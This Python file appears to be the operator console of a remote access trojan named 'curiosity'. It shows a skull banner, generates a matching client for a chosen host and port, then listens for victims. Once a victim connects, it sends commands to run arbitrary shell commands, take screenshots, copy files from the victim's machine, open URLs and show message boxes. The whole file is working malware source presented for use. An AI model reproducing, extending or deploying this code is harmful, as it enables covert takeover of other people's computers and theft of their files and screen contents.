import socket
import os
from curiosity_univ import screenshot
from curiosity_univ import platform
from curiosity_univ import open_url
from curiosity_win import msgbox
from curiosity_univ.file_transfer import server as ftp
from curiosity_univ.clone_client import clone

def Main():
	print_banner() #Runs the function to print the banner
	create_socket() #Runs the function to create a socket for listening
	await_connection() #Runs function to wait for connection, should not run until a connection has been accepted

def banner():
	os.system("color 0A")
	bob_the_skull = '''
	                uuuuuuu
	             uu$$$$$$$$$$$uu
	          uu$$$$$$$$$$$$$$$$$uu
	         u$$$$$$$$$$$$$$$$$$$$$u
	        u$$$$$$$$$$$$$$$$$$$$$$$u
	       u$$$$$$$$$$$$$$$$$$$$$$$$$u
	       u$$$$$$$$$$$$$$$$$$$$$$$$$u
	       u$$$$$$"   "$$$"   "$$$$$$u
	       "$$$$"      u$u       $$$$"
	        $$$u       u$u       u$$$
	        $$$u      u$$$u      u$$$
	         "$$$$uu$$$   $$$uu$$$$"
	          "$$$$$$$"   "$$$$$$$"
	            u$$$$$$$u$$$$$$$u
	             u$"$"$"$"$"$"$u
	  uuu        $$u$ $ $ $ $u$$       uuu
	 u$$$$        $$$$$u$u$u$$$       u$$$$
     	 $$$$$uu      "$$$$$$$$$"     uu$$$$$$
    	u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
    	$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
    	"""      ""$$$$$$$$$$$uu ""$"""
    	          uuuu ""$$$$$$$$$$uuu
    	 u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
     	$$$$$$$$$$""""           ""$$$$$$$$$$$"
     	 "$$$$$"                      ""$$$$""
     	    $$$"                         $$$$"
	'''
	return(bob_the_skull) #Returns the value of 'bob_the_skull' to the function

def print_banner():
	print(banner())

def create_socket():
	global b
	try:
		b = socket.socket() #Creates an instance of a socket
		selected_address = input('Enter The Address For Host > ') #Prompts user to enter desired socket address
		selected_port = input('Enter The Address For The Desired Port > ') #Prompts the user to enter desired port
		clone.second(selected_address, selected_port) #Runs method to create client based on the selected address and port
		b.bind((selected_address, int(selected_port))) #Once client is finished curiousity attempts to bind to selected socket
		b.listen(5) #Listens for incoming connections
		print("[+] Listening For Connection...") #Alerts the user that the socket is listening for connections
	except:
		print("Unable To Bind Socket On " + selected_address) #If creating the socket fails then alert the user

def await_connection():
	conn, addr = b.accept() #Declare the address and connection information after connection has been established
	execute_commands(conn) #Grabs the connection variable and sends it when running function

def execute_commands(conn): #Runs function with the captured connection variable
	platform_coms = [('uname')]
	while True:
		output = input("Enter a command > ")
		if (output) == 'platform':
			conn.send((output).encode('utf-8'))
			platform.Main(conn)
		elif (output) == 'cmd':
			conn.send((output).encode('utf-8'))
			cmd = input("Enter Command > ")
			conn.send((cmd).encode('utf-8'))
			recieved = (conn.recv(1024).decode('utf-8'))
			print(recieved)
		elif (output) == 'terminate':
			conn.send((output).encode('utf-8'))
			conn.close()
		elif (output) == 'create':
			conn.send((output).encode('utf-8'))
			create_type = input("Enter File or Directory > ")
			if (create_type) == 'file':
				conn.send((create_type).encode('utf-8'))
				file_name = input("Enter File Name > ")
				conn.send((file_name).encode('utf-8'))
		elif (output) == 'msgbox':
			conn.send((output).encode('utf-8'))
			msgbox.Main(conn)
		elif (output) == 'open url':
			conn.send((output).encode('utf-8'))
			open_url.server(conn)
		elif (output) == 'screenshot':
			conn.send((output).encode('utf-8'))
			screenshot.server(conn)
		elif (output) == 'transfer':
			conn.send((output).encode('utf-8'))
			file_location = input("Enter Host File Location > ")
			conn.send((file_location).encode('utf-8'))
			string_file_size = ((conn.recv(1024).decode('utf-8')))
			print(string_file_size)
			number_file_size = int(string_file_size)
			print(number_file_size)
			file_name = input("Enter File Name > ")
			f = open(os.getcwd() + "\\" + (file_name), "wb")
			while number_file_size > 0:
				l = conn.recv(1024)
				f.write(l)
				number_file_size -= len(l)
			f.close()
			
		elif (output) == None:
			print("No Input")

		else:
			print("Success")

if __name__ == '__main__':
	Main()